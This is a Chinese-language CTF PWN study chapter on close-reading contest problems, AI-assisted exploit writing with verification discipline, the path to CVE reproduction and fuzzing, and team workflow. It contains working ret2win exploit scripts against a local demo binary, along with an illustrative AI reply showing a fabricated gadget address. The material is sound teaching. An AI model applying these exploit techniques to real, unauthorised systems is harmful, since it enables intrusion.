## 2. 真题精讲：把一道大赛 PWN 题拆开读

### 2.1 挑题的三条标准

精读一道的成本是练习题的几倍，题要挑。来源有两处：CTFtime 上往届赛事的 archive（选赛方法 [[R17-赛事策略与团队协作#2.2 第一场正式赛怎么选|R17 2.2]]），以及练习平台按"大赛原题"标签归档的题（平台选型见 [[01-练习平台索引|练习平台索引]]）。挑哪道，用三条标准过一遍：

| 标准 | 怎么判断 | 不满足时的处理 |
| ---- | ---- | ---- |
| 方向覆盖率 | 数一数考点对应到已学的几章：一道题串起 ≥3 章（如栈溢出＋格式化字符串＋libc 匹配）才算精读样本 | 只覆盖 1–2 章的当练习题做，不花精读时间 |
| 技术栈契合 | 主体技术在自己已学范围内，但至少有一环是新的——新版本约束、新组合、新环境限制 | 全部熟悉的题没有增量；全部陌生的题读不动，先补对应章 |
| 有可对照的题解 | 官方题解或高质量社区 WriteUp 存在，能对上自己卡住的那一步 | 没有题解的题精读成本不可控，换一道有 archive 的 |

第三条有个前提要守住：==题解是对照组，不是答案抄本==。先自己走完全程、卡点记下来，再读题解对照——顺序反了，精读就退化成读文章（学习法 [[R08-CrackMe经典题型#9. 三遍学习法与错题本|R8 第 9 节]]）。

### 2.2 精读的六步动作

挑定的题按六步拆，每步有固定动作与固定产出：

| 步 | 动作 | 产出 |
| ---- | ---- | ---- |
| 1 读题面 | 比赛与年份、分值与解出队数、附件清单（有无 libc、Dockerfile、源码） | 题型预期与环境预期 |
| 2 查保护 | `pwn checksec` 逐行判读（[[P04-Linux安全缓解机制#7. checksec 逐行判读\|P4 第 7 节]]） | "能做/不能做"清单，选型按 [[P04-Linux安全缓解机制#8. 六种编译组合：checksec 对比与攻击方向决策\|P4 第 8 节]] 的决策表 |
| 3 找漏洞点 | 反编译定位越界写或逻辑缺陷，写成一句"原语"：任意长度栈写 / free 后可 edit / 泄露任意地址 | 漏洞原语一句话 |
| 4 读利用链 | 原语到控制权怎么走：栈题画布局（[[P06-栈溢出原理与ret2win\|P6]] 第 1 节的帧图），堆题画面（[[P17-堆风水与通用利用思路#2. 堆风水：布局是设计出来的\|P17 第 2 节]]），泄露从哪来 | 链的分步图 |
| 5 读 exp | 逐行问"这个值从哪来"：每个常量对应哪条命令的输出 | 值来源表 |
| 6 变式思考 | 换 glibc 版本还通吗（[[P12-glibc堆管理机制#9. glibc 2.43 行为注记\|P12 第 9 节]]）、去掉一个条件还通吗、约束收紧怎么办 | 变式清单，进错题本 |

第 5 步的"值来源表"值得单独说：它问的是 exp 里每个数字的出处——偏移对应量偏移的命令、地址对应查地址的命令、版本对应读版本的方法。==一张 exp 的可信程度，就是它每个值有没有出处==。这张表在第 3 节会变成 AI 辅助的核心工具。

### 2.3 解剖示范：拿已讲过的两道题当样本

精读动作放在本库已讲过的题上演示，技术细节不重讲，只看六步怎么落。样本 A 是栈题——[[P06-栈溢出原理与ret2win#4. 带参数的 win：第一个 gadget|P6 第 4 节]]的带参 ret2win：

| 步 | 在这道题上的答案 |
| ---- | ---- |
| 题面 | 自建演示题：`win` 校验 rdi 里的参数，对上 0xcafebabe 才发 flag |
| 保护 | No canary、No PIE：覆盖直达返回地址，程序内地址可写死 |

| 变式 | win 改调 system，引出 16 字节对齐（[[P06-栈溢出原理与ret2win#5. 栈 16 字节对齐与 movaps 崩溃\|P6 第 5 节]]）；删掉内联 gadget，改从 libc 搜（[[P07-ret2libc-ret2syscall-ret2shellcode\|P7]]）；打开 Canary，先泄露再利用（[[P11-Canary绕过与GOT攻击\|P11]]） |

样本 B 是堆题——[[P17-堆风水与通用利用思路#4. 综合实战：note manager|P17 第 4 节]]的 note manager：

| 步 | 在这道题上的答案 |
| ---- | ---- |
| 题面 | 菜单堆题：add / free / show / edit |

| 漏洞 | 交互试探问出来的漏洞假设清单（[[P17-堆风水与通用利用思路#3. 交互试探：把漏洞问出来\|P17 第 3 节]]） |

> 一场大赛的 PWN 题精读 2–3 道就够，按 2.1 的标准挑：一道自己解出的（对照题解查漏）、一道卡住的（重点读卡点之后的那几步）、可选一道读了题解才懂方向的。全部精读没有必要——精读练的是"把一道题读透并迁移"，量在质不在多；第 6 节的产出物归档后，每场积累一点，一年后的差距就在这张卡点清单上。

## 3. AI 辅助利用：能做什么，必须自己做什么

### 3.1 AI 在工作流里的四个位置

大模型在 PWN 解题里能干的事，按可靠程度从高到低排成四个位置：

| 位置 | 你给它什么 | 它产出什么 | 你的动作 |
| ---- | ---- | ---- | ---- |
| 读反汇编出摘要 | 反编译伪代码，或关键函数的反汇编 | "这个函数做了什么、输入怎么流动"的一段话 | 对照反汇编，抽查它点名的每一行 |
| 解释保护机制输出 | `pwn checksec` 的输出文本 | 每行含义与对选型的影响 | 对照 [[P04-Linux安全缓解机制#7. checksec 逐行判读\|P4 第 7 节]] 的判读表逐行核对 |
| 生成 exp 骨架 | 漏洞类型、收发格式、程序位宽 | 结构完整、数值留空的脚本 | 填空（3.3 完整走一遍） |
| 解释报错 | 报错原文与当时的操作 | 可能的机制与排查方向 | 回 GDB 或源码确认它说的检查真的存在（[[P17-堆风水与通用利用思路#6. 面对未知堆题的方法论 checklist\|P17 第 6 节]]的报错对照法） |

四个位置的共同点：==AI 处理的是文本，产出的是文本==。摘要、解释、骨架、报错翻译都是"文本进、文本出"，这正是语言模型擅长的形态。而一道 PWN 题里有三类东西不是文本任务，是==这个二进制里的事实==——gadget 地址、偏移、保护配置。下一节逐个看。

### 3.2 必须人工验证的三件事

**第一件：gadget 地址。** 语言模型按概率生成文本，地址在文本层面只是"长得像地址的十六进制数"——编造的地址与真实的地址在生成难度上没有任何区别，模型也没有"去查这个二进制"的动作。看一个对照样例。下面这份按常见 AI 回复的样子构造，针对的是本章 3.3 的演示程序，其中有两行是错的，判定依据在表后：

```text
分析了 vuln，这是标准 ret2win，直接用下面的参数拼 payload：

OFFSET  = 32        # buf[32]，填 32 字节即可到达返回地址
POP_RDI = 0x4015a3  # pop rdi ; ret
WIN     = 0x401196  # win 函数地址
KEY     = 0xcafebabe
payload = b'A'*OFFSET + p64(POP_RDI) + p64(KEY) + p64(WIN)
```

| 行 | 判定 | 依据 |
| ---- | ---- | ---- |
| `OFFSET = 32` | 错 | 从源码声明的 `char buf[32]` 推出来的，漏了保存的 rbp 的 8 字节；真值 40，见 3.3 第三步。[[P06-栈溢出原理与ret2win#2. 算偏移的两种方法\|P6 第 2 节]]立过规矩：偏移要量出来，不按声明算 |
| `POP_RDI = 0x4015a3` | ==编造== | 本节末尾用工具对过：这个地址不在该二进制的 84 条 gadget 里，任何一条都不是 |
| `WIN = 0x401196` | 恰好对 | 与 3.3 第二步 `nm` 的输出一致——但"恰好对"不改变规则：每个值都要自己对一遍 |
| `KEY = 0xcafebabe` | 对 | win 反汇编里的比较常数，一眼可查（3.3 的折叠框） |

编造的地址经不起工具查证。gadget 的唯一可信来源是搜程序本体的工具（[[P05-pwntools与GDB插件工具链#10. gadget 搜索：ROPgadget、ropper、one_gadget|P5 第 10 节]]）：

```bash
ROPgadget --binary vuln | tail -1
ROPgadget --binary vuln | grep -c 0x4015a3
```

输出：

```
Unique gadgets found: 84
0
```

84 条里没有 0x4015a3。把样例的错值单独填进骨架跑，各验证一个变量的影响（其余三处取真值）：

```python
#!/usr/bin/env python3
# exp_check.py —— 单变量对照：命令行参数决定哪个值采用 AI 样例里的错值
import sys
from pwn import *

context.arch = 'amd64'
context.log_level = 'error'

OFFSET  = 32 if sys.argv[1] == 'offset' else 40
POP_RDI = 0x4015a3 if sys.argv[1] == 'gadget' else 0x4011d2
KEY     = 0xcafebabe
WIN     = 0x401196

io = process('./vuln')
io.recvuntil(b'input> ')
io.sendline(b'A' * OFFSET + p64(POP_RDI) + p64(KEY) + p64(WIN))
try:
    print(repr(io.recvall(timeout=2)))
except EOFError:
    print('EOF')
io.close()
```

```bash
python3 exp_check.py gadget
```

输出：

```
b''
```

```bash
python3 exp_check.py offset
```

输出：

```
b''
```

两次都是 `b''`——程序没有输出任何内容就退出了。编造的 gadget 地址错在明处：进 gdb 看一眼，ret 根本没把它带到任何 gadget 上：

```bash
gdb -q -batch -x gdb_off.cmds ./vuln < p_halluc.bin 2>&1 | grep -A3 SIGSEGV
```

输出：

```
Program received signal SIGSEGV, Segmentation fault.
0x0000000000401fff in ?? ()
rip            0x401fff            0x401fff
rsp            0x7fffffffe160      0x7fffffffe160
```

0x4015a3 落在代码段末尾的零填充区，零字节按 add 指令解码一路执行到页边界才段错误——==从 ret 弹出的那一刻起，执行的就不再是想要的链==。错偏移更值得警惕：32 这个数"看起来有依据"（源码声明就是 32），输出却是同样的静默失败，现场不给任何提示。两类错误共用一个规律：

> [!warning] AI 说"这个二进制里有 X"，X 一律当线索
> 工具搜到了才算数。gadget 用 ROPgadget/ropper 搜，函数地址用 nm 或 pwntools 的 `e.symbols` 查，偏移用 cyclic 量——==凡是没有对应命令输出的数值，不进 payload==。

**第二件：偏移。** 样例里 `OFFSET = 32` 的错误值得展开，因为它不是编造，是==从错误前提做的正确推理==：源码声明 `buf[32]`，从声明推填充长度，逻辑自洽——但前提错了。局部区的实际大小由编译器安排，声明多大和溢出多少字节能到返回地址是两回事（[[P06-栈溢出原理与ret2win#2.3 手算对账|P6 2.3]]：手算只能当对账工具，偏移以量出来的为准）。可信来源只有一个：cyclic 模式串配 GDB 现场，量出的 40 就是 40。

**第三件：保护配置。** AI 没看过你的二进制。不把 checksec 输出贴给它，它的"分析"建立在猜测上——常见的一种猜测是按"教学环境默认"处理：No PIE、No canary。而现代发行版的默认编译恰好相反，两者全开。保护面决定选型（[[P04-Linux安全缓解机制#8. 六种编译组合：checksec 对比与攻击方向决策|P4 第 8 节]]），==建立在猜测的保护面上的利用链，每一步都可能白写==。checksec 是一条命令的事，自己跑；贴给 AI 问含义可以（3.1 的第二个位置），替你看不行。

### 3.3 工作流实证：骨架、三个空、一次跑通

演示程序与 [[P06-栈溢出原理与ret2win#4. 带参数的 win：第一个 gadget|P6 第 4 节]] 的带参 ret2win 同型：`win(long key)` 校验 0xcafebabe，`vuln()` 里 `gets` 无界读入，源码与编译参数照 P6 4.1，此处不重复——注意==地址以自己编译的产物为准==，本章的数值全部来自下面这份产物。

第一步，AI 生成 exp 骨架。把"栈溢出、win 校验 rdi 参数、64 位、gets 收输入"这些信息给它，拿回一份结构完整的脚本；采纳前人工补上三处 TODO 占位（这是纪律，3.4 展开说）：

```python
#!/usr/bin/env python3
# exp_skeleton.py —— AI 生成的 exp 骨架：结构完整，三处占位待人工填
# 题型判断依据（AI 读反编译的结论）：vuln() 里 gets(buf) 无界读入，栈溢出；
# win(key) 校验 rdi 里的参数，对上 0xcafebabe 才打印 flag —— 带参 ret2win。
from pwn import *

context.arch = 'amd64'
context.log_level = 'info'

KEY = 0xcafebabe   # win 校验的参数值：读反编译得出，AI 可给，对照反汇编一眼可查

# ===== 以下三处 AI 给不了可信值，必须自己动手后填入 =====
OFFSET  = None     # TODO(人工): cyclic 模式串喂程序 + gdb 反查（P6 第 2 节）
POP_RDI = None     # TODO(人工): ROPgadget --binary vuln | grep "pop rdi"
WIN     = None     # TODO(人工): nm vuln | grep ' T win'
# 前置确认：pwn checksec vuln —— No canary 且 No PIE 时"填充+写死地址"才成立

io = process('./vuln')
io.recvuntil(b'input> ')
io.sendline(b'A' * OFFSET + p64(POP_RDI) + p64(KEY) + p64(WIN))

success(io.recvline().decode().strip())
io.close()
```

骨架里结构部分（import、context、收发顺序、payload 拼接形状）来自 AI；三个 `None` 和那条 checksec 注释来自人工纪律。这份骨架跑不了——三个空就是三个必须自己动手的位置。

第二步，逐项查证、填空。

### 3.4 纪律清单

> [!warning] AI 辅助的五条纪律
> 1. **不跑没读过的 exp。** 先通读，凡地址、偏移、版本号，逐个换成自己工具的输出；换不出来的值（找不到对应命令）当场弃用。
> 2. **不把 AI 给的数值写进笔记。** 本库各章的规矩是每条命令配对应的输出——AI 报的数字没有命令可对，进不了笔记，也不该进自己的错题本和 exp 注释。
> 3. **机制性结论不当引用来源。** glibc 版本行为、检查触发条件这类内容，回到对应章节（[[P12-glibc堆管理机制#9. glibc 2.43 行为注记|P12 第 9 节]]、[[P17-堆风水与通用利用思路#6. 面对未知堆题的方法论 checklist|P17 第 6 节]]）；模型的版本知识常停在旧版 glibc 上，2.43 时代它讲的不少打法已经失效。
> 4. **赛内先读规则，再决定发不发题。** 把未结束赛事的附件、题面发给在线服务，可能触碰比赛的保密与公平条款（[[R17-赛事策略与团队协作#10. 心态与行为红线|R17 第 10 节]]的红线同源）；拿不准就不发，或只使用本地部署的模型。
> 5. **要"待验证清单"，不要"完整 exp"。** 提问时给足上下文——反编译片段、checksec 输出、glibc 版本、已试路线——并明确要求把它不确定的值标出来。拿到的东西越接近清单，3.2 的三件事越好做。

五条合起来一句话：==把 AI 当一个读文本很快、但对你的二进制没有任何观察手段的队友==——它给的每一条关于"事实"的话，都由你用工具落实。

## 4. 从 CTF 解题到真实漏洞挖掘

### 4.1 差异在哪

CTF PWN 题与真实漏洞利用的差别，集中在六个维度上：

| | CTF PWN 题 | 真实目标 |
| ---- | ---- | ---- |
| 漏洞 | 出题人写好，==一定存在==，通常就一处 | 未知，可能不存在，要自己找 |
| 目标 | flag | 权限、数据、可影响的范围 |
| 环境 | 附件加远程服务，版本给足或可匹配（[[P03-ELF链接与延迟绑定#6. libc 识别与版本匹配\|P3 第 6 节]]） | 版本自己识别，补丁状态未知 |
| 反馈 | 崩了就调，调试器随便挂 | 生产服务崩不得，调试手段受限 |
| 保证 | 一定可解，分值暗示难度 | 没人保证可解，投入可能归零 |
| 结束 | 提交 flag 计分 | 报告与披露流程（漏洞提交给厂商或安全团队，走负责披露） |

PWN 章节练的是最后一列也用得到的内核能力：五步流程、原语思维、对缓解机制的敏感。差距集中在第一行——==CTF 里"找漏洞"这一步被出题人替你完成了==，真实场景里这一步不但要做，还是工作量的大头。

### 4.2 迁移路径三步

**第一步：CVE 复现。** 挑"三有"的 CVE 入手：有公开分析文章、影响版本能搞到、补丁 diff 公开。动作四步：读公告（NVD、GitHub Advisory、发行版安全通告）→ 搭对应版本环境（Docker 最省事）→ 读并运行公开 PoC → 读补丁 diff，反推漏洞成因。选型从自己学过的类型入手：栈溢出、格式化字符串类的历史 CVE 分析文章最多，堆类挑经典年份的。==复现的价值在最后一步==：diff 前后一对照，"哪行代码的什么假设被打破"就落到了具体一行上——这是五步流程里第 2 步"找漏洞点"的真实版。

**第二步：沙箱靶场。** pwn.college 的课程线从 shellcode 一路排到内核，pwnable.tw 是赛题级质量，HackTheBox 有真实软件的靶场；平台按阶段选型见 [[01-练习平台索引|练习平台索引]]。靶场与练习题的差别是不贴考点标签——拿到手先自己判断打哪里，[[P19-多平台PWN#1. 分流：拿到陌生目标先问四个问题|P19 第 1 节]]的分流四问在这里第一次真正用上。

**第三步：fuzzing。** 一句话：自动生成大量变异输入喂给目标，靠崩溃报告圈出可疑位置，再由人工分析成漏洞。两个入口工具：AFL/AFL++（覆盖引导，对有源码的目标插桩后跑，`sudo apt install afl++`）；libFuzzer（随 clang 走，目标写成 `LLVMFuzzerTestOneInput` 入口函数，编译时加 `-fsanitize=fuzzer`）。CTF 赛题里几乎用不上，真实漏洞挖掘里它是主力生产力——概念先立住，动手放到靶场之后。

三条路共同的边界：==只碰授权目标==。合法边界与行为红线沿用 [[R01-逆向工程与CTF竞赛生态导论#4. 先划红线：合法边界在哪|R01 第 4 节]]与 [[R17-赛事策略与团队协作#10. 心态与行为红线|R17 第 10 节]]，靶场、复现环境、自己搭的服务是全部活动范围。往真实方向走得最远的一步在库里已经铺好：[[P18-KernelPWN入门|P18]] 的内核题，形态上最接近真实漏洞。

## 5. 团队分工与时间管理：PWN 手的节奏

组队、状态板、止损规则、hint 决策这些通用规则 [[R17-赛事策略与团队协作|R17]] 第 3、5 节讲过，本节只讲 PWN 手在队内的三件特有事。

### 5.1 开局 15 分钟：全队过一遍保护面

[[R17-赛事策略与团队协作#5.1 开赛第一个小时|R17 5.1]] 的开局一小时里，PWN 手的第一个任务是把全部 PWN 题附件下载完，每题 `file` 加 `pwn checksec` 加反编译扫一眼，单题上限 3 分钟——快扫不是解题，是采集分级信号。PWN 题的快扫信号与判断：

| 快扫信号 | 判断 | 先翻哪章 |
| ---- | ---- | ---- |
| 静态链接 | libc 在程序里，gadget 不缺，无需配 libc | [[P07-ret2libc-ret2syscall-ret2shellcode\|P7]] |
| 动态链接且附 libc | 先读版本（[[P03-ELF链接与延迟绑定#6. libc 识别与版本匹配\|P3 第 6 节]]）；匹配工作可当场转交 RE 主力（[[R17-赛事策略与团队协作#9. RE 与 PWN 的协同\|R17 第 9 节]]） | [[P03-ELF链接与延迟绑定\|P3]] |
| 菜单堆题（[[P13-基础堆漏洞#1. 菜单堆题：堆漏洞的标准舞台\|P13 第 1 节]]的形态） | 版本判断先于一切技术选型 | [[P12-glibc堆管理机制#9. glibc 2.43 行为注记\|P12 第 9 节]] |
| 题面点名 sandbox / seccomp | orw 路线预期，工时按高档预估 | [[P07-ret2libc-ret2syscall-ret2shellcode\|P7]] 的 shellcode |
| Partial RELRO | GOT 写写入落点候选 | [[P11-Canary绕过与GOT攻击\|P11]] |

每个信号的判读都指向一道工序：配 libc、判版本、估工时。产出是每题一行进状态板（[[R17-赛事策略与团队协作#3.2 队内协作惯例|R17 3.2]]），分级排序仍按 [[R17-赛事策略与团队协作#5.2 题目分级：三个信号|R17 5.2]] 的三个信号走——==保护面信息只回答"这题要多少工序"，做不做人手上的下一题，由已解出队数说了算==。

### 5.2 exploit 模板热备

[[P05-pwntools与GDB插件工具链#11. 实战：封装个人 exploit 模板|P5 第 11 节]] 的 template.py 在赛前就放进模板目录（开赛清单 [[R17-赛事策略与团队协作#4. 赛前：开赛清单|R17 第 4 节]]里的一行），赛时每道新题只改"题目信息区"两行。热备的价值在两头：开局阶段省掉每题重写脚本的十分钟；收尾阶段本地换远程是一行命令的事，最后一小时的提交窗口不浪费在改代码上。3.3 的 exp_skeleton.py 同样进模板目录——两份骨架，一份通用于交互题，一份对应"AI 起骨架"的流程。

### 5.3 卡题换手的交接格式

RE 与 PWN 之间的三行交接在 [[R17-赛事策略与团队协作#9. RE 与 PWN 的协同|R17 第 9 节]]。PWN 方向内部换手（A 卡 30 分钟按止损规则转给 B），交接写四行：

1. **原语与触发输入**：哪个函数、什么顺序的交互能触发；
2. **版本判定结论**：附件 libc 有无、判定的版本、依据；
3. **已试路线**：每条配失败现象——不是"不行"，是"poisoning 之后 malloc 落到了 0x404000 附近"这样的具体观察；
4. **卡住的检查报错原文**：GDB 崩溃现场一行，或 malloc_printerr 的完整一行。

> [!note] 第四行为什么要原文
> [[P17-堆风水与通用利用思路#6. 面对未知堆题的方法论 checklist|P17 第 6 节]]的排错法第一步就是"把崩溃点定位到哪条检查"——报错原文里带着检查名，转述一遍就丢了。B 接手后拿原文对照检查表，十分钟内能站到 A 三十分钟的位置上。

## 6. 赛后复盘：PWN 题的产出物

复盘会的开法与通用产出物 [[R17-赛事策略与团队协作#8. 赛后：复盘|R17 第 8 节]]讲过。PWN 题的复盘多三样专属产出：

**exp 库。** 两级目录，第一级按漏洞类，第二级按缓解组合或版本：

```text
exp-lib/
├── stack/
│   ├── ret2win_nocanary_nopie/
│   └── ret2libc_leak_partialrelro/
├── heap/
│   ├── uaf_tcache_2.31/
│   └── offbynull_2.43/
└── fmtstr/
    └── got_rewrite_hn/
```

每个 exp 头部五行注释，一行不省：

```python
# 来源：XXCTF 2026 pwn_note（赛后按题解补完）
# 环境：Ubuntu 22.04 / glibc 2.35（附件 libc，patchelf 装载）
# 缓解：Partial RELRO / No canary / NX / PIE
# 状态：本地通 + 远程通
# 思路：UAF → tcache poisoning → 任意写 → _IO_FILE 流程劫持
```

两条归档原则：同一题型只留最优的一份，旧的移进归档目录；==未解出的题在题解公开后补写完整 exp==，头部标"赛后补"——这类条目是 exp 库里学习密度最高的部分，因为它们当初正好卡在自己能力的边界上。

**技术卡点。** 进错题本（四列模板 [[R08-CrackMe经典题型#9. 三遍学习法与错题本|R8 第 9 节]]），PWN 行额外标一列 glibc 版本：==版本敏感的卡点三年后还有效，不标版本的卡点三个月就过期==——glibc 一升级行为就变（[[P12-glibc堆管理机制#9. glibc 2.43 行为注记|P12 第 9 节]]整节都在讲这件事）。

**新套路入模式库。** 模式库模板在 [[R16-综合实战案例复盘|R16]]。PWN 条目的字段：触发条件（什么样的题面与保护组合适用）、版本区间、最小示例（交互序列或代码片段）、关联章节。一场比赛下来若没有新套路，把旧套路的"版本区间"字段更新一遍也是产出。

WriteUp 的特别要求在 [[R17-赛事策略与团队协作#7.1 标准结构模板|R17 7.1]] 模板之上多三样必给：exp 全文、环境版本（发行版加 glibc 版本）、libc 附件与 patchelf 处理方式——缺了这三样，别人拿着不同 glibc 复现不出来，WriteUp 的"从零复现"标准就不达标。

| 现象 | 原因与解决 |
| ---- | ---- |
| AI 给的 exp 一跑就没输出 | 3.2 的三件事没做：gadget 地址、偏移、保护配置逐个换成自己工具的输出再跑；先查它给的地址在不在 ROPgadget 的输出里 |

| 赛内能不能把题目发给在线 AI | 先读比赛规则；多数比赛禁止赛内公开题解，把附件发给第三方服务是否违规以规则为准，拿不准就不发（3.4 纪律四） |
| 真题精读完就忘 | 产出物没落盘：值来源表、变式清单、卡点记录三样写成文；第二遍只读卡住的步（[[R08-CrackMe经典题型#9. 三遍学习法与错题本\|R8 第 9 节]]） |
| 首战 PWN 手只解出签到题 | 正常。签到 ret2win 也是一条完整链，按第 8 节实战任务讲给新人，讲清每个值的来源就是练习；完赛标准见 [[R17-赛事策略与团队协作#11. 常见问题\|R17 第 11 节]]的同款问题 |
| 题目 libc 和本地对不上 | 识别与匹配 [[P03-ELF链接与延迟绑定#6. libc 识别与版本匹配\|P3 第 6 节]]，patchelf 装载 [[P03-ELF链接与延迟绑定#5.3 patchelf：把题目环境装到本地\|P3 5.3]]；这类活可转交 RE 主力（[[R17-赛事策略与团队协作#9. RE 与 PWN 的协同\|R17 第 9 节]]） |
| 想往真实漏洞挖掘走 | 第 4.2 节的三步：CVE 复现起步，靶场跟进，fuzzing 概念先立住；合法边界在动手前重读一遍 |

> [!note] 实战任务：完赛，并讲清一条链
> **报名一场赛事（CTFtime 按 [[R17-赛事策略与团队协作#2.2 第一场正式赛怎么选|R17 2.2]] 的五条标准筛，或 XCTF 系按官方渠道报名），组队完赛，解出 ≥2 道 PWN，并把其中一道从头到尾讲给队内新人。** 执行要点：
> - 赛前：开赛清单过一遍（[[R17-赛事策略与团队协作#4. 赛前：开赛清单\|R17 第 4 节]]）；[[P05-pwntools与GDB插件工具链#11. 实战：封装个人 exploit 模板\|P5 第 11 节]]的 template.py 与本章 3.3 的 exp_skeleton.py 放进模板目录；
> - 赛中：开局 15 分钟按 5.1 快扫全部 PWN 题进状态板；时间与止损按 [[R17-赛事策略与团队协作#5.3 卡题止损与 hint 决策\|R17 5.3]] 执行；AI 参与（如果用）守 3.4 的五条纪律；
> - 赛后：exp 按 6 的格式归档、卡点进错题本、至少 2 道 PWN 写 WriteUp（[[R17-赛事策略与团队协作#7.1 标准结构模板\|R17 7.1]] 模板加 7.2 自检清单）；
> - ==讲给新人==：按 [[P01-PWN导论与缓解机制全景#2. 利用链构建的五步流程\|P1 第 2 节]]的五步流程走一遍，讲到每个数值时回答"它从哪来"——命令是什么、输出是什么。能答全，这条链才真的属于你；讲的过程就是 2.2 精读六步的口头版。
